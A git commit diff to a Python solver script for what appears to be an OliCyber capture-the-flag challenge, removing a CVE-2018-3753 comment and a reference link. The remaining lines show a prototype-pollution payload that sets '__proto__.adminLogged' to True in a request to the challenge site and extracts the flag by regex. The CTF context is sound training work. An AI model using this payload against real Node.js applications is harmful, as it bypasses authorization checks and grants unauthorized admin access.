f8532aeb350588b792ffe3f19b8d0f196ac10759
Federico Bosio <76971799+bosioF@users.noreply.github.com>
2025-07-25 11:39:24 +0200

    Update hiadmin.py

--- 2022 DEMO Territoriale/hiadmin.py
+++ 2022 DEMO Territoriale/hiadmin.py
@@ -1,10 +1,8 @@
-#!/usr/bin/env python3
-''' CVE-2018-3753 '''
 import requests, re
 
 reg = r'flag{.*?}'
 site = "http://hi-admin.challs.olicyber.it/hi"
-payload = { # prototye pollution https://security.snyk.io/vuln/npm:merge-objects:20180415
+payload = { # prototye pollution
     "name":"bosio",
     "__proto__":{
         "adminLogged":True
